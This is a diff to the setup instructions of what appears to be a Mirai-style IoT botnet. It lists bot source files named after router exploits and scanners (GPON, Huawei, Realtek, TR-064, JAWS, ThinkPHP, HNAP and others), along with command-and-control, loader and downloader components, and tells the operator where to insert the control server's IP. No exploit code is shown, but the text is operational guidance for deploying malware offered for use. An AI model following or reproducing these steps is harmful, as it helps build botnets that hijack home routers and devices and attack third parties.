@@ -73,16 +73,24 @@ mv cross-compiler-x86_64 x86_64
 
  CHANGE IP(s) IN /bot/includes.h
  CHANGE IP(s) IN /bot/huawei.c
+ CHANGE IP(s) IN /bot/asus.c
+ CHANGE IP(s) IN /bot/comtrend.c
+ CHANGE IP(s) IN /bot/dlink_scanner.c
+ CHANGE IP(s) IN /bot/gpon443.c
+ CHANGE IP(s) IN /bot/jaws.c
+ CHANGE IP(s) IN /bot/linksys.c
  CHANGE IP(s) IN /bot/gpon80_scanner.c
- CHANGE IP(s) IN /bot/huawei.c
+ CHANGE IP(s) IN /bot/netlink.c
+ CHANGE IP(s) IN /bot/tr064.c
  CHANGE IP(s) IN /bot/realtek.c
  CHANGE IP(s) IN /bot/thinkphp.c
  CHANGE IP(s) IN /bot/hnap_scanner.c
  CHANGE IP(s) IN /cnc/main.go
- CHANGE IP(s) IN /dlr/main.c -> For example your server ip is 127.0.0.1 the format should be (127,0,0,1) replace the . with , 
  CHANGE IP(s) IN /loader/src/main.c
  CHANGE IP(s) IN /loader/src/headers/config.h
  CHANGE IP(s) IN /scanListen.go
+ CHANGE IP(s) IN /dlr/main.c
+------------------------------
 ------------------------------------------
 
 // Install mysql on centos 7.x
